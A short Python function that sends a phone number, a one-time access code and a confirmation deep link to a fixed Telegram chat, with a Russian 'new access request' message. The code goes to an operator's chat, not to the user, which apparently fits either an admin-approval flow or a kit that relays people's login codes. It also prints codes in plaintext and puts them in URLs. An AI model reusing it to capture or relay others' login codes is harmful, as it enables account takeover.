import os
import httpx

async def send_telegram_code(phone: str, code: str, session_id: str, site_url: str):
    bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
    chat_id = os.getenv("TELEGRAM_CHAT_ID")
    
    if not bot_token or not chat_id:
        print(f"DEMO: {phone} -> code {code}")
        print(f"Link: {site_url}/?sessionId={session_id}&code={code}")
        return True
    
    deep_link = f"{site_url}/?sessionId={session_id}&code={code}"
    message = f"🔐 *НОВЫЙ ЗАПРОС ДОСТУПА*\n\n📱 Номер: {phone}\n🔑 Код: `{code}`\n\n✅ [ПОДТВЕРДИТЬ ДОСТУП]({deep_link})\n\n_Ссылка действительна 15 минут_"
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": False
    }
    
    async with httpx.AsyncClient() as client:
        try:
            response = await client.post(url, json=payload)
            result = response.json()
            if result.get("ok"):
                print(f"✅ Telegram sent to {chat_id}")
                return True
            else:
                print(f"❌ Telegram error: {result}")
                return False
        except Exception as e:
            print(f"❌ Exception: {e}")
            return False
